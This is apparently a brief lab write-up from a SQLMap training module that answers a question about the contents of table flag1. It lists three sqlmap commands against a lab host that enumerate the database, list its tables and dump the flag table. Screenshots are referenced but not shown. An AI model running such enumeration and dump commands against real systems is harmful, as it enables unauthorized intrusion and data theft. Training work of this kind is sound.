# [Database Enumeration](SQLMap%20Essentials/Database%20Enumeration.md)
### What's the contents of table flag1 in the testdb database? (Case #1)

```shell
sqlmap -u 'http://154.57.164.74:31979/case1.php?id=1' --banner --current-user --current-db --is-dba
```
![](Screenshot%202026-06-23%20at%2013.07.10.png)

```shell
sqlmap -u 'http://154.57.164.74:31979/case1.php?id=1' --tables -D testdb
```
![](Screenshot%202026-06-23%20at%2013.07.29.png)

```shell
sqlmap -u 'http://154.57.164.74:31979/case1.php?id=1' --dump -T flag1
```
![](Screenshot%202026-06-23%20at%2013.07.45.png)
